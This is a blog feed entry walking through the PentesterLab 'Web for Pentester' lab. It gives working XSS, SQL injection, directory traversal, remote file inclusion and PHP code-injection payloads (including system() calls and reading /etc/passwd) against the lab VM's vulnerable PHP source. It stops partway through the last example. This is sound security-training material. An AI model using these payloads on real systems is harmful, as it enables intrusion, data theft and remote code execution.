<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-05-14T15:24:19-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Web for Pentester]]></title>
    <link href="http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester/"/>
    <updated>2017-05-04T06:38:11-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester</id>
    <content type="html"><![CDATA[<p>Today I want to mix things up a bit, and do a challenge focused exclusively on web vulnerabilities. For the target, I will use the Web for Pentester ISO offered by <a href="https://www.pentesterlab.com/">PentesterLab</a>. They host many challenges dedicated to web hacking, and I recommend you give them a try!</p>

<!-- more -->


<p>Navigating to the VM, we are greeted by this page:</p>

<p><img class="center" src="/images/pentest/webpentester/web.png" title="&lsquo;web for pentester&rsquo; &lsquo;web for pentester&rsquo;" ></p>

<p>As you can see, we&rsquo;ve got plenty of exercises, so let&rsquo;s begin!</p>

<h3>XSS</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss1.png" title="&lsquo;xss&rsquo; &lsquo;web for pentester xss 1&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
<html>
Hello
&lt;?php</p>

<pre><code>echo $_GET["name"];
</code></pre>

<p>?></p>

<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This is the most basic type of injection:</p>

<p>``` html</p>

<script>alert('there')</script>


<p>```</p>

<p>Now you will get an alert box and if you look in the source, you will see the exact same injection, with no filtering whatsoever.</p>

<p><strong>Example 2</strong></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello
&lt;?php</p>

<p>$name =  $_GET[&ldquo;name&rdquo;];
$name = preg_replace(&ldquo;/<script>/&rdquo;,&ldquo;&rdquo;, $name);
$name = preg_replace(&ldquo;/&lt;\/script>/&rdquo;,&ldquo;&rdquo;, $name);
echo $name;
?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This one looks like the previous one, but in the source, we can see that the script tags are replaced with empty strings, but only for lowercase. I changed the case of the script tags to SCRIPT, and the alert box was back!</p>

<p><strong>Example 3</strong></p>

<p>The source looks like this:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello
&lt;?php</p>

<pre><code>$name =  $_GET["name"];
$name = preg_replace("/&lt;script&gt;/i","", $name);
$name = preg_replace("/&lt;\/script&gt;/i","", $name);
</code></pre>

<p>echo $name;
?></p>

<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This time the script tags are filtered regardless of the case. To see what&rsquo;s going on, I inserted script tags inside a placeholder value:</p>

<p><code>plain
place&lt;script&gt;holder
</code></p>

<p>As expected, they disappear into the abyss, and the message echoed in the page is Hello placeholder . I then tried doubling the script tags:</p>

<p><code>plain
place&lt;&lt;script&gt;&gt;holder
</code></p>

<p>The message changed to <code>Hello place&lt;>holder</code> . This is great, it means we can have nested tags that will be interpreted! I built the payload to:</p>

<p><code>plain
 &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
</code></p>

<p><strong>Example 4</strong></p>

<p>Source:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;;</p>

<p>if (preg_match(&lsquo;/script/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
  die(&ldquo;error&rdquo;);
}
?></p>

<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This time, the script throws an error if it sees anything resembling script tags. Luckily, we can get an XSS payload to execute in different ways. For this I used:</p>

<p><code>plain
&lt;img src='nope' onerror="alert('Got ya')" /&gt;
</code></p>

<p><strong>Example 5</strong></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;;</p>

<p>if (preg_match(&lsquo;/alert/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
  die(&ldquo;error&rdquo;);
}
?></p>

<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>All right, it looks like script tags aren&rsquo;t blacklisted anymore, but this time the alert word is. I just substituted the alert for prompt:</p>

<p>``` plain</p>

<script>prompt('Enter pwn code')</script>


<p>```</p>

<p><strong>Example 6</strong></p>

<p>PHP source:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= "<?php  echo $_GET["name"]; ?>";
</script>


<pre><code>&lt;?php require_once '../footer.php'; ?&gt;
</code></pre>

<p>```</p>

<p>This time, whatever we place inside the name variable is assigned to a variable. The page source looks like this:</p>

<p>``` html
Hello</p>

<script>
    var $a= "hacker";
</script>


<p>```</p>

<p>We want to build on the existing code and add our own. This means we will have to close the quotes and add our payload. First, I inserted something to see the changes:</p>

<p><code>plain
hacker";INJECTION
</code></p>

<p>And in the HTML code I saw this:</p>

<p><code>plain
var $a= "hacker";INJECTION";
</code></p>

<p>The part up to the first semicolon is what we want, then we have to place our payload, but a stray doublequote and semicolon remain. To get rid of them, I commented them out, and the final injection looked like this:</p>

<p><code>plain
hacker";alert("not enough");//
</code></p>

<p>And in the source it is rendered the following way:</p>

<p><code>plain
var $a= "hacker";alert("not enough");//";
</code></p>

<p><strong>Example 7</strong></p>

<p>PHP code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= '<?php  echo htmlentities($_GET["name"]); ?>';
</script>


<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>It appears that now there is encoding performed on the name variable to prevent the previous type of bypass. Let&rsquo;s see how the source looks with the previous payload:</p>

<p><code>plain
var $a= 'hacker&amp;quot;;alert(&amp;quot;not enough&amp;quot;);//';
</code></p>

<p>The attack was nullified, but if you look at the <code>htmlentities</code> PHP manual page, you will see that, if not otherwise specified, the default flag is ENT_COMPAT, which converts double-quotes and leaves single-quotes alone. So all I had to do was replace the double-quotes with single-quotes:</p>

<p><code>plain
hacker';alert('still not enough');//
</code></p>

<p>And this is translated in the HTML as:</p>

<p><code>plain
var $a= 'hacker';alert('stillnot enough');//';
</code></p>

<p><strong>Example8</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss8.png" title="&lsquo;xss 8&rsquo; &lsquo;web for pentester xss 8&rsquo;" ></p>

<p>This looks a little different, we input something and it gets echoed back in a greeting: HELLO something</p>

<p>Source code:</p>

<p>``` php
&lt;?php
  require_once &lsquo;../header.php&rsquo;;</p>

<p>  if (isset($_POST[&ldquo;name&rdquo;])) {</p>

<pre><code>echo "HELLO ".htmlentities($_POST["name"]);
</code></pre>

<p>  }
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>&ldquo; method="POST&rdquo;>
  Your name:<input type="text" name="name" />
  <input type="submit" name="submit"/></p>

<p>&lt;?php</p>

<p>  require_once &lsquo;../footer.php&rsquo;;</p>

<p>?>
```</p>

<p>PHP_SELF returns the currently executing script and its path from the root folder. In our case, where the URL is <a href="http://192.168.217.138/xss/example8.php">http://192.168.217.138/xss/example8.php</a> , PHP_SELF would be /xss/example8.php .</p>

<p><a href="http://form.guide/php-form/php-form-action-self.html">The PHP_SELF variable</a> is vulnerable to XSS if not enclosed within htmlentities(). Which means we can put our payload in the URL: <a href="http://192.168.217.138/xss/example8.php/INJECTION">http://192.168.217.138/xss/example8.php/INJECTION</a></p>

<p>Now, we need to take note of how to build the payload:</p>

<p><code>html
HELLO hacker&lt;form action="/xss/example8.php/hacker" method="POST"&gt;
</code></p>

<p>My successful injection was:</p>

<p><code>plain
hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"
</code></p>

<p>And the source now looks like this:</p>

<p><code>html
&lt;form action="/xss/example8.php/hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"" method="POST"&gt;
</code></p>

<p>The first double-quote and <code>></code> closed the form action part, then came the injection, and then I put another double-quote to keep company to the stray one that remained.</p>

<p><strong>Example9</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss9.png" title="&lsquo;xss 9&rsquo; &lsquo;dom xss&rsquo;" ></p>

<p>Whatever we put after the pound sign gets rendered on the page. Here&rsquo;s the code that does it:</p>

<p>``` html</p>

<script>
  document.write(location.hash.substring(1));
</script>


<p>```</p>

<p>First, we have to understand the <a href="https://www.w3schools.com/jsref/jsref_substring.asp">substring</a> method:</p>

<blockquote><p> string.substring(start, end)</p>

<p>This method extracts the characters in a string between &ldquo;start&rdquo; and &ldquo;end&rdquo;, not including &ldquo;end&rdquo; itself.
Characters start at index 0</p></blockquote>

<p>And the <a href="https://www.w3schools.com/jsref/prop_loc_hash.asp">location.hash</a> returns the anchor part of the URL. So if our URL is <a href="http://192.168.217.138/xss/example9.php#moo">http://192.168.217.138/xss/example9.php#moo</a> , it will return #moo . And combined with the substring function, whatever comes after the hash is written to the page, as we saw at the beginning.</p>

<p>This page is vulnerable to DOM-based XSS, where a modification the DOM environment affects how the client code is running. Just put the payload after the hash sign, and reload the page (I had to use Chrome to see the alert):</p>

<p><code>plain
http://192.168.217.138/xss/example9.php#&lt;script&gt;alert('Bye')&lt;/script&gt;
</code></p>

<h3>SQL injections</h3>

<p><strong>Example1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/sql1.png" title="&lsquo;sqli&rsquo; &lsquo;sql injection&rsquo;" ></p>

<p>Ok, before tampering with anything, let&rsquo;s look at the source:</p>

<p>``` php
&lt;?php</p>

<p>  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);</p>

<pre><code>$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";  
$result = mysql_query($sql);
if ($result) {
    ?&gt;
    &lt;table class='table table-striped'&gt;
  &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;
    &lt;?php
    while ($row = mysql_fetch_assoc($result)) {
        echo "&lt;tr&gt;";
            echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
        echo "&lt;/tr&gt;";
    }   
    echo "&lt;/table&gt;";
}
</code></pre>

<p>  require_once &lsquo;../footer.php&rsquo;;
?>
```</p>

<p>So, the code looks in the users table for whatever we give it, and if a match is found, it displays some info. You can see there is no filtering on our input, and the DB query is <code>SELECT * FROM users where name=&lsquo;input&rsquo;</code>. This is trivial to bypass, by using <code>root' or 1=1&mdash; </code> (there is a space after &mdash;), and don&rsquo;t forget to URL encode for it to work! The query now becomes <code>SELECT * FROM users where name=&lsquo;root&rsquo; or 1=1&mdash; &lsquo;</code>, and the stray quote is commented out.</p>

<p><img class="center" src="/images/pentest/webpentester/sqlinj1.png" title="&lsquo;sqli&rsquo; &lsquo;sqli results&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>This example looks the same like the previous one, but the difference is in the code:</p>

<p>``` php
if (preg_match(&lsquo;/ /&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>

<pre><code>    die("ERROR NO SPACE");  
}
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>Basically, the space characters are being filtered out. However, we can achieve the same results by using tabs (<code>\t</code>), which would change the previous injection to: <code>SELECT * FROM users where name=&lsquo;root&rsquo; or  1=1#</code>, where the same outcome is achieved by substituting the spaces for tabs and the comment characters from <code>&mdash; </code> to <code>#</code>. Again, don&rsquo;t forget URL encoding though!</p>

<p><strong>Example3</strong></p>

<p>Same-looking page, but slightly different code:</p>

<p>``` php
if (preg_match(&lsquo;/\s+/&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>

<pre><code>    die("ERROR NO SPACE");  
}
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>This time, a regular expression prevents the use of any whitespace characters, including tabs, carriage returns, etc. It is possible to bypass this by using <a href="http://www.sqlinjection.net/comments/">C-style comments</a>: <code>/**/</code>. Here, our injection would be:</p>

<p><code>plain
'/**/or/**/1=1#
</code></p>

<p>And the DB query would look like this:</p>

<p><code>sql
SELECT * FROM users where name='root'/**/or/**/1=1#'
</code></p>

<p>As always, don&rsquo;t forget to URL encode when injecting!</p>

<p><strong>Example4</strong></p>

<p>Here, the URL looks just a tiny bit different: <a href="http://192.168.217.138/sqli/example4.php?id=2">http://192.168.217.138/sqli/example4.php?id=2</a></p>

<p>And the code:</p>

<p>``` php
$sql=&ldquo;SELECT * FROM users where id=&rdquo;;</p>

<pre><code>$sql.=mysql_real_escape_string($_GET["id"])." ";
$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>So, the query performed is <code>SELECT * FROM users where id=INPUT </code>, but this time, the <code>mysql_real_escape_string</code> function is used to escape the characters: <code>\x00, \n, \r, \, &lsquo;, &ldquo; and \x1a</code>. All that protection is for naught however, because the id parameter is an integer, where there is no need to use quotes. So I injected <code>2 or 1=1&mdash; </code> and again saw all results.</p>

<p><strong>Example5</strong></p>

<p>We have the same example as the previous one, but with some modifications to the underlying code:</p>

<p>``` php
if (!preg_match(&lsquo;/^[0-9]+/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"] ;

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>The regular expression will make the script throw an error and stop executing if it encounters non-integer characters in the input. But the check is only made at the beginning of the input, as can be seen from the fact that there is a <code>^</code>, but not a <code>$</code> delimiter for the end. Again, the injection is trivial: <code>id=2 or 1=1&mdash; </code>.</p>

<p><strong>Example6</strong></p>

<p>The developer tried to fix the previous mistake with:</p>

<p>``` php
if (!preg_match(&lsquo;/[0-9]+$/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"] ;


$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>Now the code checks for the end of the string to be an integer, but not for the beginning xD Well, we can inject without worrying that we have to comment something afterwards: <code>id=2 or 1=1</code></p>

<p><strong>Example7</strong></p>

<p>Finally, the code checks for integers both at the beginning and the end:</p>

<p>``` php
if (!preg_match(&lsquo;/^&ndash;?[0-9]+$/m&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"];

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>There is something new in this regex: a PCRE_MULTILINE pattern modifier. Let&rsquo;s see what this does:</p>

<blockquote><p> m (PCRE_MULTILINE)</p>

<p>   By default, PCRE treats the subject string as consisting of a single &ldquo;line&rdquo; of characters
(even if it actually contains several newlines). The &ldquo;start of line&rdquo; metacharacter (^) matches
only at the start of the string, while the &ldquo;end of line&rdquo; metacharacter ($) matches only at the
end of the string, or before a terminating newline (unless D modifier is set). This is the same
as Perl. When this modifier is set, the &ldquo;start of line&rdquo; and &ldquo;end of line&rdquo; constructs match
immediately following or immediately before any newline in the subject string, respectively, as
well as at the very start and end. This is equivalent to Perl&rsquo;s /m modifier. If there are no
&ldquo;\n&rdquo; characters in a subject string, or no occurrences of ^ or $ in a pattern, setting this
modifier has no effect.</p></blockquote>

<p>So, the regex checks will be performed correctly on the first line, but we can insert new lines and inject our payload there, and no checks will be performed! With the payload <code>id=2%0A or 1=1</code>, a new line has been injected, and then the rest of the payload.</p>

<p><strong>Example8</strong></p>

<p><img class="center" src="/images/pentest/webpentester/sql8.png" title="&lsquo;sqli&rsquo; &lsquo;sqli 8&rsquo;" ></p>

<p>This example introduces the ORDER BY statement:</p>

<p><code>php
$sql = "SELECT * FROM users ORDER BY `";
$sql .= mysql_real_escape_string($_GET["order"])."`";
$result = mysql_query($sql);
</code></p>

<p>The SQL query looks like this:</p>

<p><code>sql
SELECT * FROM users ORDER BY `INPUT`;
</code></p>

<p>For this exploitation, I used <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">this very helpful article about time-based injection in the ORDER BY clause</a>:</p>

<p><code>plain
order=name`,(select sleep(3) from dual where database() like database())#
</code></p>

<p>First, the successful injection will be reflected by the time it takes to load the page, specified inside the <a href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep">SLEEP</a> function. The <a href="http://www.w3resource.com/sql/sql-dual-table.php">DUAL table</a> is a special table that can be used in queries that don&rsquo;t need data from any tables. <a href="http://www.bitbybit.dk/carsten/blog/?p=201">DATABASE()</a> returns the value of the currently selected  DB, and the <a href="https://www.tutorialspoint.com/sql/sql-like-clause.htm">LIKE</a> operator is used to compare a value with another similar one. For the injection to work, don&rsquo;t forget to URL encode! Now, let&rsquo;s see how the full query would look like:</p>

<p><code>sql
SELECT * FROM users ORDER BY `name`,(select sleep(3) from dual where database() like database())#`;
</code></p>

<p>That LIKE statement is useful, because it induces a condition that is matched by the SELECT statement.</p>

<p><strong>Example9</strong></p>

<p>Source code:</p>

<p><code>php
$sql = "SELECT * FROM users ORDER BY ";
$sql .= mysql_real_escape_string($_GET["order"]);
$result = mysql_query($sql);
</code></p>

<p>No more backticks here. I used the same payload as in the previous example, but without the backticks (and URL encoded):</p>

<p><code>plain
order=(select sleep(3) from dual where database() like database())#
</code></p>

<h3>Directory traversal</h3>

<p><strong>Example1</strong></p>

<p>If you inspect the image link, you will see: <code>dirtrav/example1.php?file=hacker.png</code>. The source code for this challenge is:</p>

<p>``` php
&lt;?php</p>

<p>$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>

<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>

<pre><code>die();
</code></pre>

<p>$file = $_GET[&lsquo;file&rsquo;];</p>

<p>$path = $UploadDir . $file;</p>

<p>if (!is_file($path))</p>

<pre><code>die();
</code></pre>

<p>header(&lsquo;Cache-Control: must-revalidate, post-check=0, pre-check=0&rsquo;);
header(&lsquo;Cache-Control: public&rsquo;);
header(&lsquo;Content-Disposition: inline; filename=&ldquo;&rsquo; . basename($path) . &lsquo;&rdquo;;&rsquo;);
header(&lsquo;Content-Transfer-Encoding: binary&rsquo;);
header(&lsquo;Content-Length: &rsquo; . filesize($path));</p>

<p>$handle = fopen($path, &lsquo;rb&rsquo;);</p>

<p>do {
$data = fread($handle, 8192);
if (strlen($data) == 0) {
break;
}
echo($data);
} while (true);</p>

<p>fclose($handle);
exit();</p>

<p>?>
```</p>

<p>There is no filtering involved, so I displayed the <em>/etc/passwd</em> file with: <a href="http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd">http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd</a></p>

<p><img class="center" src="/images/pentest/webpentester/passwd.png" title="&lsquo;passwd file&rsquo; &lsquo;passd file&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>The path for this one is <code>dirtrav/example2.php?file=/var/www/files/hacker.png</code>. In the code, we are only interested in the parts that manipulate the file to be included:</p>

<p>``` php
$file = $_GET[&lsquo;file&rsquo;];</p>

<p>if (!(strstr($file,&ldquo;/var/www/files/&rdquo;)))</p>

<pre><code>die();
</code></pre>

<p>```</p>

<p>The script tries to enforce the location of the file to be in /var/www/files, but we can leave it as it is and just go up a few directories and include the passwd file again: <code>file=/var/www/files/../../../etc/passwd</code>.</p>

<p><strong>Example 3</strong></p>

<p>Here is the path: <code>dirtrav/example3.php?file=hacker</code></p>

<p>And the code:</p>

<p>``` php
$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>

<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>

<pre><code>die();
</code></pre>

<p>$file = $_GET[&lsquo;file&rsquo;];</p>

<p>$path = $UploadDir . $file.&ldquo;.png&rdquo;;
// Simulate null-byte issue that used to be in filesystem related functions in PHP
$path = preg_replace(&lsquo;/\x00.*/&rsquo;,&ldquo;&rdquo;,$path);</p>

<p>if (!is_file($path))</p>

<pre><code>die();
</code></pre>

<p>```</p>

<p>The code gives the hint of exploiting this: the null byte, which will make the system ignore anything that comes after it. So the extension check will be bypassed: <code>file=../../../../../etc/passwd%00</code></p>

<h3>File Include</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/fileinc.png" title="&lsquo;file includes&rsquo; &lsquo;file inclusion&rsquo;" ></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>if ($_GET["page"]) {
    include($_GET["page"]);

} 
</code></pre>

<p>?>
```</p>

<p>There is no validation performed on the file to be included. For this challenge, PentesterLab provides a sample include file that calls phpinfo() at <a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></p>

<p>Just include the above file to see the output of phpinfo(): <code>page=<a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></code></p>

<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>The URL is slightly different now: <a href="http://192.168.217.138/fileincl/example2.php?page=intro">http://192.168.217.138/fileincl/example2.php?page=intro</a></p>

<p>And the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>if ($_GET["page"]) {
$file = $_GET["page"].".php";
// simulate null byte issue
$file = preg_replace('/\x00.*/',"",$file);
    include($file);
} 
</code></pre>

<p>?>
```</p>

<p>So the code automatically appends a PHP extension to the file, but is also vulnerable to null bytes. I included the same file as in the previous example, with a <code>%00</code> at the end: <code>page=<a href="http://assets.pentesterlab.com/test_include.txt%00">http://assets.pentesterlab.com/test_include.txt%00</a></code></p>

<h3>Code injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/code1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php
  $str=&ldquo;echo \"Hello &rdquo;.$_GET[&lsquo;name&rsquo;].&ldquo;!!!\&rdquo;;&ldquo;;</p>

<p>  eval($str);
?>
```</p>

<p>The string <code>echo &ldquo;Hello hacker!!!&rdquo;;</code> is passed to eval. Whatever else we input after the name variable comes right after hacker and before the exclamation signs: Hello hacker@!!! (with an example of adding @ after hacker). However, if we input a double-quote, we get an error:</p>

<p><code>plain
Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/codeexec/example1.php(6) : eval()'d code on line 1
</code></p>

<p>That is because eval now has to evaluate the broken syntax of <code>echo &ldquo;Hello hacker&rdquo;!!!&ldquo;;</code>. We can take advantage of this by appending a command and then commenting out the remaining <code>!!!&rdquo;;</code>:</p>

<p><code>plain
name=hacker" . system('hostname');//
</code></p>

<p>URL encode it and you will see the output:</p>

<p><img class="center" src="/images/pentest/webpentester/codeinj1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1 success&rsquo;" ></p>

<p>This worked because what eval saw was: <code>echo &ldquo;Hello hacker&rdquo; . system(&lsquo;hostname&rsquo;);//!!!&ldquo;;</code></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="/images/pentest/webpentester/code2.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 2&rsquo;" ></p>

<p>PHP code:</p>

<p>``` php
&lt;?php
class User{
  public $id, $name, $age;
  function __construct($id, $name, $age){</p>

<pre><code>$this-&gt;name= $name;
$this-&gt;age = $age;
$this-&gt;id = $id;
</code></pre>

<p>  } <br/>
}
  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;../sqli/db.php&rsquo;);</p>

<pre><code>$sql = "SELECT * FROM users ";

$order = $_GET["order"];
$result = mysql_query($sql);
</code></pre>

<p>  if ($result) {</p>

<pre><code>    while ($row = mysql_fetch_assoc($result)) {
  $users[] = new User($row['id'],$row['name'],$row['age']);
}
if (isset($order)) { 
  usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
}
}   

    ?&gt;
</code></pre>

<table class='table table-striped' >
        <tr>
            <th><a href="example2.php?order=id">id</th>
            <th><a href="example2.php?order=name">name</th>
            <th><a href="example2.php?order=age">age</th>
        </tr>
        <?php

    foreach ($users as $user) {  
            echo "<tr>";
                echo "<td>".$user->id."</td>";
                echo "<td>".$user->name."</td>";
                echo "<td>".$user->age."</td>";
            echo "</tr>";
        }   
        echo "</table>


<p>  require &lsquo;../footer.php&rsquo;;
?>
```</p>

<p>The line to focus on is:</p>

<p><code>php
usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
</code></p>

<p>Here, the <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">PentesterLab course</a> explains the vulnerability exists in the <a href="https://secure.php.net/manual/en/function.usort.php">usort(array, user-defined function)</a> function, because it uses <a href="https://secure.php.net/manual/en/function.create-function.php">create_function(args, code)</a>, which is used to create an anonymous (lambda-style) function. <strong>create_function</strong> is vulnerable to unfiltered input because it uses eval() at its core. There is a known <a href="http://www.exploitalert.com/view-details.html?id=10264">exploit</a> that allows code injection and executing the code without creating and calling the function. Let&rsquo;s see how this works:</p>

<p><strong>create_function</strong> is a ZEND_FUNCTION defined in <em>zend_builtin_functions.c</em>. Here is part of the vulnerable code:</p>

<p><img class="center" src="/images/pentest/webpentester/ffs.png" title="&lsquo;c code&rsquo; &lsquo;vulnerable code&rsquo;" ></p>

<p>The folks at PentesterLab were nice enough to help me understand this, I was in one of those states where you don&rsquo;t see the forest from the trees! Basically, the code for the lambda function is the string inside curly brackets, and there is no filtering for {}. So later, this same user-supplied string gets evaluated by zend_eval_string. We can inject code in the $order parameter, so our code gets in this line:</p>

<p><code>php
usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
</code></p>

<p>And that line will be used in the format string. The payload I used is : <code>order=id);}echo &lsquo;INJECTION SUCCESSFUL&rsquo;;//</code>. Now, inside eval(), the lambda function without injection looks something like this:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');}
</code></p>

<p>Let&rsquo;s deconstruct it step by step. Adding <strong>);</strong> closes the call to strcmp, but leaves garbage behind and also an unclosed {} , because the end curly bracket is now part of the discarded code:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');,$b-&gt;'.$order.');}
</code></p>

<p>Adding a closing curly bracket correctly closes the format string, so now we have:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');},$b-&gt;'.$order.');}
</code></p>

<p>To test where I was with the injection, I left it at that and got this error:</p>

<p><code>plain
Parse error: syntax error, unexpected ',' in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/codeexec/example2.php on line 22
</code></p>

<p>So the code picks up after the curly bracket, we know we have to comment out the rest. And between the curly bracket and the comment characters we can put our code:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');}echo 'INJECTION SUCCESSFUL';//,$b-&gt;'.$order.');}
</code></p>

<p>And the result:</p>

<p><img class="center" src="/images/pentest/webpentester/codeinj2.png" title="&lsquo;code injection 2&rsquo; &lsquo;code injection&rsquo;" ></p>

<p>eval() now sees a strcmp, which is executed (but only with 1 parameter, hence the warning). Then eval goes further, sees our code and executes it (the warning doesn&rsquo;t stop the execution). And finally, eval reaches the leftovers, which have been commented out, so it does nothing.</p>

<p>This here was my favorite part in all the challenge!</p>

<p><strong>Example 3</strong></p>

<p>Here we have the familiar hello hacker message, but with a twist on the URL: <a href="http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer</a></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
</code></pre>

<p>?>
```</p>

<p>Ok, preg_replace searches inside the base parameter (Hello lamer) for matches to the pattern parameter (hacker) and replaces them with what&rsquo;s in the new parameter (hacker).</p>

<p>The problem with preg_replace is that it can be passed the modifier <a href="https://secure.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">e (PREG_REPLACE_EVAL)</a> that causes PHP to <a href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">execute the replacement value</a>.</p>

